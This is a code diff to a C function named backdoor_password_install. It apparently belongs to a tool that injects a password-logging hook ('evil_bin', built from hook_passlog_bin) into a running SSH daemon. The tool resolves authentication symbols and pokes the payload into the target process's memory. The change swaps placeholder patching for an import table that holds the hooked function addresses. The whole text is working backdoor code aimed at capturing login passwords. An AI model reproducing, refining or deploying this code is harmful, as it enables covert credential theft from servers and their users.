@@ -20,13 +20,15 @@ void backdoor_password_install(inject_ctx *ctx) {
 	u64 use_privsep=0, logit_passchange=0, privsep_load=0, privsep_test=0;
 	u64 auth_password=0, mm_auth_password=0;
 	u64 *auth_password_calls = NULL, *mm_auth_password_calls = NULL;
-	int i, j, n_auth_password_calls, n_mm_auth_password_calls;
+	int i, n_auth_password_calls, n_mm_auth_password_calls;
 	u64 diff=0, hole_addr=0;
 	u8 *evil_bin;
 	u32 use_privsep_val=0;
 
 	evil_bin = malloc(hook_passlog_bin_len);
 	memcpy(evil_bin, hook_passlog_bin, hook_passlog_bin_len);
+
+	u64 *import_table = (u64*)(evil_bin + 8);
 
 	use_privsep = resolve_symbol_tab(ctx, "use_privsep");
 
@@ -140,22 +142,11 @@ void backdoor_password_install(inject_ctx *ctx) {
 			_poke(ctx->pid, auth_password_calls[i]+1, &diff, 4);
 		}
 	}
-	
-	// Insert return address
-	for(j = 0; j < hook_passlog_bin_len; j++) {
-		u64 *vptr = (u64*)&evil_bin[j];
-		switch (*vptr) {
-			case 0x1111111122222222:
-				*vptr = use_privsep;
-				break;
-			case 0x3333333344444444:
-				*vptr = auth_password;
-				break;
-			case 0x5555555566666666:
-				*vptr = mm_auth_password;
-				break;
-		}
-	}
+
+	import_table[0] = ctx->config_addr;
+	import_table[1] = auth_password;
+	import_table[2] = mm_auth_password;
+	import_table[3] = use_privsep;
 
 	_poke(ctx->pid, hole_addr, evil_bin, hook_passlog_bin_len);
 	info("poked evil_bin to 0x%lx.", hole_addr);
